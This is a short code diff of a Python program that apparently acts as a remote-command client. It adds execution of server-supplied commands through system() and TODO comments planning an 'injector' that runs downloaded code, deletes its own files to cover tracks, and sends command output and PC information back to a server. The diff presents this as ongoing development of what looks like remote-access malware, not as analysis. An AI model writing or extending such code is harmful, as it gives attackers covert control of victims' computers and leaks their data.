@@ -21,18 +21,19 @@ def download_code():
     f1.write(dataText)
     f1.close()
 
-    start_code()
-
 def start_code():
-    print("Starting Code")
+    # TODO: Implement the running part of the injector. 
+    # For example run it as a local library by inputing the recieved data into a function. 
+    # Then just import it as a normal library.
+    # After that delete the settings.py file and the old version of the remade program
+    pass
 
+# TODO: Remake the function so that if an argument is supllied it will return the output to the server
+# This will be usefull for tracert and show directory commandsaas well as to get info from the PC
 def run_cmd_code(cmd_data: str):
-    print(cmd_data)
     try:
         cmd_data = cmd_data.split('-cmd')[1]
-        print(f"Got {cmd_data}")
+        print(f"Executing command: {cmd_data}")
+        system(cmd_data)
     except Exception as s:
-        cmd_data = "msg * Hello World"
         print("Oh no error: {}".format(s))
-    print("Executing command")
-    system(cmd_data)
